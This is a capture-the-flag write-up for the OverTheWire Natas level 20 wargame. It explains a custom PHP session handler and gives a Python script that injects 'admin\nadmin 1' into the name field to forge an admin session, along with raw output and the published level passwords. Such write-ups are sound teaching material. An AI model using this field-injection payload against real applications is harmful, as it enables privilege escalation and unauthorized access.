# CTF Writeup - **OverTheWire Natas19 - Natas20**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas19 - Natas20
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 18-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using session hijacking.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
URL:      http://natas20.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for an input name to be changed.  But we dont know anything about it, So lets input some random names and check it out. 

```bash
You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
Your name: Admin
Change Name
# You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.
```

Now we see that it doesnot do anything. Lets view the source code since we know that the source code is in `http://natas20.natas.labs.overthewire.org/index-source.html`.

```bash
# <?php

# function debug($msg) { /* {{{ */
#     if(array_key_exists("debug", $_GET)) {
#         print "DEBUG: $msg<br>";
#     }
# }
# /* }}} */
# function print_credentials() { /* {{{ */
#     if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
#     print "You are an admin. The credentials for the next level are:<br>";
#     print "<pre>Username: natas21\n";
#     print "Password: <censored></pre>";
#     } else {
#     print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
#     }
# }
# /* }}} */

# /* we don't need this */
# function myopen($path, $name) {
#     //debug("MYOPEN $path $name");
#     return true;
# }

# /* we don't need this */
# function myclose() {
#     //debug("MYCLOSE");
#     return true;
# }

# function myread($sid) {
#     debug("MYREAD $sid");
#     if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
#     debug("Invalid SID");
#         return "";
#     }
#     $filename = session_save_path() . "/" . "mysess_" . $sid;
#     if(!file_exists($filename)) {
#         debug("Session file doesn't exist");
#         return "";
#     }
#     debug("Reading from ". $filename);
#     $data = file_get_contents($filename);
#     $_SESSION = array();
#     foreach(explode("\n", $data) as $line) {
#         debug("Read [$line]");
#     $parts = explode(" ", $line, 2);
#     if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
#     }
#     return session_encode() ?: "";
# }

# function mywrite($sid, $data) {
#     // $data contains the serialized version of $_SESSION
#     // but our encoding is better
#     debug("MYWRITE $sid $data");
#     // make sure the sid is alnum only!!
#     if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
#     debug("Invalid SID");
#         return;
#     }
#     $filename = session_save_path() . "/" . "mysess_" . $sid;
#     $data = "";
#     debug("Saving in ". $filename);
#     ksort($_SESSION);
#     foreach($_SESSION as $key => $value) {
#         debug("$key => $value");
#         $data .= "$key $value\n";
#     }
#     file_put_contents($filename, $data);
#     chmod($filename, 0600);
#     return true;
# }

# /* we don't need this */
# function mydestroy($sid) {
#     //debug("MYDESTROY $sid");
#     return true;
# }
# /* we don't need this */
# function mygarbage($t) {
#     //debug("MYGARBAGE $t");
#     return true;
# }

# session_set_save_handler(
#     "myopen",
#     "myclose",
#     "myread",
#     "mywrite",
#     "mydestroy",
#     "mygarbage");
# session_start();

# if(array_key_exists("name", $_REQUEST)) {
#     $_SESSION["name"] = $_REQUEST["name"];
#     debug("Name set to " . $_REQUEST["name"]);
# }

# print_credentials();

# $name = "";
# if(array_key_exists("name", $_SESSION)) {
#     $name = $_SESSION["name"];
# }

# ?>
```

This PHP script manages custom session handling for a web application, allowing users to set their name and access session-based functionality. It uses custom functions (`myread` and `mywrite`) to read from and write to session files, ensuring the `session ID` is valid (alphanumeric) and securely saving data in a file named `mysess_<sid>` in the session save path. When a user sets a name via the `name` parameter in a request, it updates the session with this value and writes it to the session file. The script also checks if the user is an admin (`$_SESSION["admin"] == 1`) and, if so, displays the credentials for the next level (username and password). If the user is not an admin, it informs them they are logged in as a regular user. Debugging messages are optionally displayed if the debug parameter is present in the request. The data whether user is admin or not is stored in session as a variable.

The script reads and writes session data using the `myread` and `mywrite` functions. In `mywrite`, the session data is serialized and saved in the format `key value\n`. For example, if the session contains `name` and `admin`, the saved data would look like this: `name admin\nadmin 0\n`

When the session is read using `myread`, this data is split by newline characters and spaces to reconstruct the session array. With this understanding, it is possible to exploit the file format by injecting a crafted `name` value, such as `admin\nadmin 1`. When written to the session file, it results in the following data: `name admin\nadmin 1\n`

Upon reading this data, the `myread` function will interpret the second line as setting the `admin` flag to `1`, thereby granting admin privileges.

This logic can be exploited by making a POST request to the server with the crafted `name` parameter to manipulate the session file. Below is an example of how to execute this exploit using Python and the `requests` library:


```bash
import requests

target = 'http://natas20.natas.labs.overthewire.org?debug=true'
auth = ('natas20','p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')

session = requests.Session()

r = session.get(target, auth=auth)
print(r.text)

r = session.post(target, auth=auth, data={'name':'admin\nadmin 1'})
print(r.text)


r = session.get(target, auth=auth)
print(r.text)
```



```bash
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
# <body>
# <h1>natas20</h1>
# <div id="content">
# DEBUG: MYREAD ops2rulih80ovmo6r6fabh7r05<br>DEBUG: Session file doesn't exist<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.    
# <form action="index.php" method="POST">
# Your name: <input name="name" value=""><br>
# <input type="submit" value="Change name" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
# DEBUG: MYWRITE ops2rulih80ovmo6r6fabh7r05 <br>DEBUG: Saving in /var/lib/php/sessions/mysess_ops2rulih80ovmo6r6fabh7r05<br>
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
# <body>
# <h1>natas20</h1>
# <div id="content">
# DEBUG: MYREAD ops2rulih80ovmo6r6fabh7r05<br>DEBUG: Reading from /var/lib/php/sessions/mysess_ops2rulih80ovmo6r6fabh7r05<br>DEBUG: Read []<br>DEBUG: Name set to admin
# admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
# <form action="index.php" method="POST">
# Your name: <input name="name" value="admin
# admin 1"><br>
# <input type="submit" value="Change name" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
# DEBUG: MYWRITE ops2rulih80ovmo6r6fabh7r05 name|s:13:"admin
# admin 1";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_ops2rulih80ovmo6r6fabh7r05<br>DEBUG: name => admin
# admin 1<br>
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
# <body>
# <h1>natas20</h1>
# <div id="content">
# DEBUG: MYREAD ops2rulih80ovmo6r6fabh7r05<br>DEBUG: Reading from /var/lib/php/sessions/mysess_ops2rulih80ovmo6r6fabh7r05<br>DEBUG: Read [name admin]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
# Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
# <form action="index.php" method="POST">
# Your name: <input name="name" value="admin"><br>
# <input type="submit" value="Change name" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
# DEBUG: MYWRITE ops2rulih80ovmo6r6fabh7r05 name|s:5:"admin";admin|s:1:"1";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_ops2rulih80ovmo6r6fabh7r05<br>DEBUG: admin => 1<br>DEBUG: name => admin<br>
```


## Flag

**Flag:** BPhv63cKE1lkQl04cE5CuFTzXe15NfiH


---

## Lessons Learned

It was a bit of challenge for me. I was able to grasp the idead behind the solution very easily. I learnt a lot on how to approach these types of challenges.